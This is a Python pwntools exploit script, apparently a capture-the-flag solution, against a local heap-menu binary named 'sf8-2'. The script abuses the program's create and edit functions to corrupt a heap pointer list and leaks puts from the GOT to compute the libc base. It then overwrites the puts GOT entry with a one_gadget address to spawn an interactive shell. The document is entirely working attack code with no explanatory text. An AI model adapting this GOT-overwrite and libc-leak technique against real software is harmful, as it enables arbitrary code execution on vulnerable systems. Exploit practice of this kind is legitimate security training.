from pwn import *

p = process('./sf8-2')

# 0x6020A0
# 0x400BEE
one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one_gadget_server = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def Create(name, kind, old):
   p.sendline('1')
   p.sendafter('>', name)
   p.sendafter('>', kind)
   p.sendafter('>', old)
   p.recvuntil('id:')
   idx = p.recv(1)
   print idx
   return idx

def Edit(idx, name, kind, old, ck):
   p.sendline('2')
   p.sendafter('>', str(idx))
   p.sendafter('>', name)
   p.sendafter('>', kind)
   p.sendafter('>', old)
   p.sendafter('>', ck)

def Print(idx):
   p.sendafter('>', '3')
   p.sendafter('>', str(idx))

def PrintAll():
   p.sendline('4')

def Delete(idx):
   p.sendline('5')
   p.sendafter('>', str(idx))

puts_plt = 0x4006B0
puts_got = 0x602028
heap_list = 0x6020A0

# Libc_leak Set
Create('a'*0x16, 'b'*0x16, '21')
Create('a'*0x16, 'b'*0x16, '22')
# Create('a'*0x16, 'b'*0x16, '22')
Edit(1, 'aaaa', 'bbbb', '36', 'n')
Create('b'*0x16, p64(heap_list + 0x18), '22')
Edit(1, p64(puts_plt), p64(puts_got), '36', 'y')

# Libc_leak
Print(2)
p.recvuntil('name: ')
puts_libc = u64(p.recv(6).ljust(8, '\x00'))
libc_base = puts_libc - 0x6f6a0
print hex(libc_base)

# Got overwrite
Edit(0, 'cccc', 'dddd', '36', 'n')
Create('b'*0x16, p64(puts_got), '22')
raw_input()
Edit(0, p64(libc_base + one_gadget[0]), 'a', '36', 'y')

p.interactive()
